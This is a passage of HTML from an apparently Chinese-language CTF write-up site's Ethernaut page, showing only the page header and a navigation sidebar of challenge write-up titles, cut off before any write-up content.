
<!doctype html>
<html lang="zh" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
        <meta name="author" content="YanhuiJessica">
      
      
        <link rel="canonical" href="https://yanhuijessica.github.io/Chictf-Writeups/wargames/ethernaut/">
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-8.3.3">
    
    
      
        <title>OpenZeppelin：Ethernaut - Chictf-Writeups</title>
      
    
    
  
      <link rel="stylesheet" href="../../assets/stylesheets/main.4a0965b7.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.cbb835fc.min.css">
        
          
          
          <meta name="theme-color" content="#ffffff">
        
      
      
    
<style>
  .md-typeset h1 {
    color:var(--md-default-fg-color--light);
    font-size:2em;
    line-height:1.3;
    margin:0 0 1em;
  }
</style>

    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Fira+Sans:300,300i,400,400i,700,700i%7CFira+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Fira Sans";--md-code-font:"Fira Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="white" data-md-color-accent="red">
  
    
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#0-hello-ethernaut" class="md-skip">
          跳转至
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="页眉">
    <a href="../.." title="Chictf-Writeups" class="md-header__button md-logo" aria-label="Chictf-Writeups" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 3 1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Chictf-Writeups
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              OpenZeppelin：Ethernaut
            
          </span>
        </div>
      </div>
    </div>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="查找">
        
          <a href="javascript:void(0)" class="md-search__icon md-icon" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08Z"/></svg>
          </a>
        
        <button type="reset" class="md-search__icon md-icon" aria-label="清空当前内容" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            正在初始化搜索引擎
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header__source">
        <a href="https://github.com/YanhuiJessica/Chictf-Writeups" title="前往仓库" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    YanhuiJessica/Chictf-Writeups
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
  <div class="md-tabs__inner md-grid">
    <ul class="md-tabs__list">
      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../.." class="md-tabs__link">
        简介
      </a>
    </li>
  

      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../../misc/unpleasant_music/" class="md-tabs__link">
        Misc
      </a>
    </li>
  

      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../../web/t_star_upload_bypass/" class="md-tabs__link">
        Web
      </a>
    </li>
  

      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../../reverse/easyre/" class="md-tabs__link">
        Reverse
      </a>
    </li>
  

      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../../pwn/when_did_you_born/" class="md-tabs__link">
        Pwn
      </a>
    </li>
  

      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../../crypto/bank/" class="md-tabs__link">
        Crypto
      </a>
    </li>
  

      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../../blockchain/code_is_law/" class="md-tabs__link">
        Blockchain
      </a>
    </li>
  

      
        
  
  
    
  


  
  
  
    <li class="md-tabs__item">
      <a href="../natas/" class="md-tabs__link md-tabs__link--active">
        Wargames
      </a>
    </li>
  

      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../../eggs/ctfhub_index/" class="md-tabs__link">
        彩蛋
      </a>
    </li>
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Chictf-Writeups" class="md-nav__button md-logo" aria-label="Chictf-Writeups" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 3 1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82Z"/></svg>

    </a>
    Chictf-Writeups
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/YanhuiJessica/Chictf-Writeups" title="前往仓库" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    YanhuiJessica/Chictf-Writeups
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_1" type="checkbox" id="__nav_1" >
      
      
      
      
        <label class="md-nav__link" for="__nav_1">
          简介
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="简介" data-md-level="1">
        <label class="md-nav__title" for="__nav_1">
          <span class="md-nav__icon md-icon"></span>
          简介
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        首页
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../how_to_participate/" class="md-nav__link">
        如何参与
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
      
      
      
      
        <label class="md-nav__link" for="__nav_2">
          Misc
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Misc" data-md-level="1">
        <label class="md-nav__title" for="__nav_2">
          <span class="md-nav__icon md-icon"></span>
          Misc
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/unpleasant_music/" class="md-nav__link">
        Unpleasant music
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/leaf_cover_eyes/" class="md-nav__link">
        一叶障目
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/difficult_programming_language/" class="md-nav__link">
        Difficult Programming Language
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/secret_information/" class="md-nav__link">
        机密信息
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/hide_and_seek/" class="md-nav__link">
        藏藏藏
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/targz_y1ng/" class="md-nav__link">
        TARGZ-y1ng
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/gakki/" class="md-nav__link">
        gakki
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_8" type="checkbox" id="__nav_2_8" >
      
      
      
      
        <label class="md-nav__link" for="__nav_2_8">
          HackerGame 2020
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="HackerGame 2020" data-md-level="2">
        <label class="md-nav__title" for="__nav_2_8">
          <span class="md-nav__icon md-icon"></span>
          HackerGame 2020
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/account_bot/" class="md-nav__link">
        从零开始的记账工具人
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/gibberish_message/" class="md-nav__link">
        从零开始的火星文生活
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/self_repeating_repeater/" class="md-nav__link">
        自复读的复读机
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/233_string_tool/" class="md-nav__link">
        233 同学的字符串工具
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/233_docker/" class="md-nav__link">
        233 同学的 Docker
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/4f_system_middle/" class="md-nav__link">
        来自一教的图片
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/basic_math_simulator/" class="md-nav__link">
        超基础的数理模拟器
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/stegano50/" class="md-nav__link">
        Stegano50
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/newsctf_all_reverse/" class="md-nav__link">
        NEWSCTF - ！了反都，了反
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/audio_frequency_stego/" class="md-nav__link">
        audio-frequency-stego
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_12" type="checkbox" id="__nav_2_12" >
      
      
      
      
        <label class="md-nav__link" for="__nav_2_12">
          DeconstruCT.F 2021
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="DeconstruCT.F 2021" data-md-level="2">
        <label class="md-nav__title" for="__nav_2_12">
          <span class="md-nav__icon md-icon"></span>
          DeconstruCT.F 2021
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/pirates/" class="md-nav__link">
        Pirates
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/teg_rads/" class="md-nav__link">
        Teg Rads
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/hearing_not_believing/" class="md-nav__link">
        HearingNotBelieving
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_14" type="checkbox" id="__nav_2_14" >
      
      
      
      
        <label class="md-nav__link" for="__nav_2_14">
          HackerGame 2021
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="HackerGame 2021" data-md-level="2">
        <label class="md-nav__title" for="__nav_2_14">
          <span class="md-nav__icon md-icon"></span>
          HackerGame 2021
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/transparent_file/" class="md-nav__link">
        透明的文件
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/encrypted_u_disk/" class="md-nav__link">
        加密的 U 盘
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/p_q/" class="md-nav__link">
        p😭q
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_15" type="checkbox" id="__nav_2_15" >
      
      
      
      
        <label class="md-nav__link" for="__nav_2_15">
          西湖论剑 2021
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="西湖论剑 2021" data-md-level="2">
        <label class="md-nav__title" for="__nav_2_15">
          <span class="md-nav__icon md-icon"></span>
          西湖论剑 2021
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/yusa_little_secret/" class="md-nav__link">
        YUSA的小秘密
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/yusa_secret/" class="md-nav__link">
        Yusa的秘密
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/compress_the_flag/" class="md-nav__link">
        Compress The Flag
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/s_script_gi/" class="md-nav__link">
        s/&lt;script&gt;//gi
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/log4_sanity_check/" class="md-nav__link">
        Log 4 sanity check
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/bishop_duel/" class="md-nav__link">
        Bishop Duel
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/lighthouse/" class="md-nav__link">
        Lighthouse
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/last_digit/" class="md-nav__link">
        last digit
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
      
      
      
      
        <label class="md-nav__link" for="__nav_3">
          Web
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Web" data-md-level="1">
        <label class="md-nav__title" for="__nav_3">
          <span class="md-nav__icon md-icon"></span>
          Web
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/t_star_upload_bypass/" class="md-nav__link">
        文件上传 JS 绕过
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/t_star_tomcat/" class="md-nav__link">
        小猫咪踩灯泡
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/ctfhub_reflected_xss/" class="md-nav__link">
        CTFHub - 反射型 XSS
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/initiative/" class="md-nav__link">
        主动
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/funhash/" class="md-nav__link">
        Funhash
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/xss_game/" class="md-nav__link">
        XSS Game
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/web_php_include/" class="md-nav__link">
        Web php include
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/ctfhub_git_leakage/" class="md-nav__link">
        CTFHub - Git 泄露
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/newsctf_easy_web/" class="md-nav__link">
        NEWSCTF - easy_web
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/heres_a_flag/" class="md-nav__link">
        Here's a Flag
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_11" type="checkbox" id="__nav_3_11" >
      
      
      
      
        <label class="md-nav__link" for="__nav_3_11">
          HackerGame 2021
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="HackerGame 2021" data-md-level="2">
        <label class="md-nav__title" for="__nav_3_11">
          <span class="md-nav__icon md-icon"></span>
          HackerGame 2021
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/sale_melon/" class="md-nav__link">
        卖瓜
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/flag_red_packet/" class="md-nav__link">
        FLAG 助力大红包
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/info_above_graph/" class="md-nav__link">
        图之上的信息
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/most_secure_crypto_algo/" class="md-nav__link">
        Most Secure Crypto Algo
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/calculus_calc_exercise/" class="md-nav__link">
        微积分计算小练习
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" >
      
      
      
      
        <label class="md-nav__link" for="__nav_4">
          Reverse
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Reverse" data-md-level="1">
        <label class="md-nav__title" for="__nav_4">
          <span class="md-nav__icon md-icon"></span>
          Reverse
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../reverse/easyre/" class="md-nav__link">
        EasyRe
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../reverse/z3/" class="md-nav__link">
        z3
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../reverse/newsctf_re_signin/" class="md-nav__link">
        NEWSCTF - re_signin
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5" type="checkbox" id="__nav_5" >
      
      
      
      
        <label class="md-nav__link" for="__nav_5">
          Pwn
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Pwn" data-md-level="1">
        <label class="md-nav__title" for="__nav_5">
          <span class="md-nav__icon md-icon"></span>
          Pwn
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../pwn/when_did_you_born/" class="md-nav__link">
        when did you born
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../pwn/amnesia/" class="md-nav__link">
        Amnesia
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6" type="checkbox" id="__nav_6" >
      
      
      
      
        <label class="md-nav__link" for="__nav_6">
          Crypto
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Crypto" data-md-level="1">
        <label class="md-nav__title" for="__nav_6">
          <span class="md-nav__icon md-icon"></span>
          Crypto
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/bank/" class="md-nav__link">
        bank
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/shanghai/" class="md-nav__link">
        shanghai
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/easy_rsa/" class="md-nav__link">
        easy_RSA
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/normal_rsa/" class="md-nav__link">
        Normal_RSA
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/easy_ecc/" class="md-nav__link">
        easy_ECC
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/fanfie/" class="md-nav__link">
        fanfie
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/jefferson_disk/" class="md-nav__link">
        转轮机加密
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/code_modulate/" class="md-nav__link">
        编码与调制
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/ciscn_rsa/" class="md-nav__link">
        CISCN - rsa
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/opisthocomus_hoazin/" class="md-nav__link">
        opisthocomus-hoazin
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/stars_and_shapes/" class="md-nav__link">
        Stars and Shapes
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/he_thrusts_his_fists_against_the_post/" class="md-nav__link">
        He Thrusts His Fists Against the Post
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6_13" type="checkbox" id="__nav_6_13" >
      
      
      
      
        <label class="md-nav__link" for="__nav_6_13">
          PBCTF 2021
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="PBCTF 2021" data-md-level="2">
        <label class="md-nav__title" for="__nav_6_13">
          <span class="md-nav__icon md-icon"></span>
          PBCTF 2021
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/alkaloid_stream/" class="md-nav__link">
        Alkaloid Stream
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/steroid_stream/" class="md-nav__link">
        Steroid Stream
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/easyxor/" class="md-nav__link">
        easyxor
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/ustc_easy_rsa/" class="md-nav__link">
        HackerGame - Easy RSA
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/baby_mac/" class="md-nav__link">
        Baby MAC
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/noteasy03/" class="md-nav__link">
        noteasy03
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/dealymaffs/" class="md-nav__link">
        Dealymaffs
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/weird_programmer/" class="md-nav__link">
        Weird Programmer
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/x_factor/" class="md-nav__link">
        X Factor
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/paiaiai/" class="md-nav__link">
        P(ai)^3
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/casino/" class="md-nav__link">
        Casino
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/black_hole/" class="md-nav__link">
        Black Hole
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
